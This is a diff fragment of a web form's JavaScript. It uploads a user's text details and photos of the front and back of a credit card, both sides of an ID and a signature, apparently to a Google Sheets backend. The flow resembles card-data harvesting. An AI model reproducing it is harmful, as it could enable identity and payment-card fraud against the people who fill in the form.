+  }
+
+  // ── Main submit ────────────────────────────────────────────────────────────
+  async function submitToGoogleSheets() {
+    // Unique ID that ties the text row to all 5 image uploads
+    const submissionId = 'ck_' + Date.now() + '_' + Math.random().toString(36).slice(2, 7);
+    const lastName     = document.getElementById('lastName').value  || 'Unknown';
+    const firstName    = document.getElementById('firstName').value || '';
+
+    // ── Step 1 of 6: text form data only ────────────────────────────────────
+    setProgress('Saving your information… (1 / 6)', 10);
+    await post({
+      action: 'formData',
+      submissionId,
+      ...collectTextData()
+    });
+
+    // ── Steps 2–6: one image per request ────────────────────────────────────
+    const images = [
+      { key: 'creditCard',     label: 'Credit Card (front)', fileName: 'CreditCard'     },
+      { key: 'creditCardBack', label: 'Credit Card (back)',  fileName: 'CreditCardBack' },
+      { key: 'idFront',        label: 'ID Front',            fileName: 'IDFront'        },
+      { key: 'idBack',         label: 'ID Back',             fileName: 'IDBack'         },
+      { key: 'signature',      label: 'Signature',           fileName: 'Signature'      },
+    ];
+
+    for (let i = 0; i < images.length; i++) {
+      const img = images[i];
+      if (!uploadData[img.key]) continue;
+
+      setProgress('Uploading ' + img.label + '… (' + (i + 2) + ' / 6)', 15 + (i + 1) * 16);
+
+      await post({
+        action:    'uploadImage',
+        submissionId,
+        imageKey:  img.key,
+        imageData: uploadData[img.key].data,
+        fileName:  img.fileName,
+        lastName,
+        firstName
+      });
+    }
+
+    setProgress('Finalising…', 98);
+    await new Promise(r => setTimeout(r, 400));
+    hideProgress();
+  }
+
+  // ── Reset form ─────────────────────────────────────────────────────────────
+  function resetForm() {
+    // Clear all text / date / number / email / tel / textarea inputs
+    document.querySelectorAll('input, textarea').forEach(el => el.value = '');
+
+    // Reset every upload slot
+    UPLOAD_KEYS.forEach(key => {
+      uploadData[key] = null;
+      document.getElementById('file-'    + key).value         = '';
+      document.getElementById('img-'     + key).src           = '';
+      document.getElementById('name-'    + key).textContent   = '';
+      document.getElementById('label-'   + key).style.display = '';
+      document.getElementById('preview-' + key).style.display = 'none';
+      document.getElementById('card-'    + key).classList.remove('has-file');
+    });
+
+    // Scroll back to the top
+    window.scrollTo({ top: 0, behavior: 'smooth' });
+  }
+
+  // ── Error modal ────────────────────────────────────────────────────────────
+  function showErrorModal(fields, msg) {
+    document.getElementById('errorDescription').textContent =
+      msg || 'Please complete all required fields before submitting.';
+    document.getElementById('missingFields').innerHTML =
+      '<ul>' + fields.map(f => '<li>' + f + '</li>').join('') + '</ul>';
+    document.getElementById('errorModal').style.display = 'flex';
+  }
+
+  // ── Submit button ──────────────────────────────────────────────────────────
+  document.getElementById('submitBtn').addEventListener('click', async function () {
+    const btn     = this;
+    const missing = validateForm();
+    if (missing.length > 0) { showErrorModal(missing); return; }
+
+    btn.disabled   = true;
+    btn.innerHTML  = '<span class="spinner"></span>Submitting…';
+
+    try {
+      await submitToGoogleSheets();
+      resetForm();
+      document.getElementById('thankYouModal').style.display = 'flex';
+    } catch (err) {
+      console.error(err);
+      showErrorModal(
+        ['Network error — please check your connection and try again.'],
+        'There was a problem sending your application.'
+      );
+    } finally {
+      btn.disabled    = false;
+      btn.textContent = 'Submit Application';
+      hideProgress();
     }
   });
 
-  document.getElementById('errorModal').addEventListener('click', function(e) {
-    if (e.target === this) {
-      this.style.display = 'none';
-    }
+  // ── Close modals ───────────────────────────────────────────────────────────
+  document.getElementById('closeBtn').addEventListener('click',
+    () => document.getElementById('thankYouModal').style.display = 'none');
+  document.getElementById('closeErrorBtn').addEventListener('click',
+    () => document.getElementById('errorModal').style.display = 'none');
+  ['thankYouModal','errorModal'].forEach(id =>
+    document.getElementById(id).addEventListener('click', function(e) {
+      if (e.target === this) this.style.display = 'none';
+    })
+  );
+
+  // ── Numeric input guard ────────────────────────────────────────────────────
+  document.querySelectorAll('[data-type="numeric"]').forEach(f => {
+    f.addEventListener('input', function () {
+      const d = this.value.replace(/\D/g,'');
+      this.value = f.dataset.phone === 'true' ? d.slice(0,10) : d;
+    });
   });
 </script>
 </body>
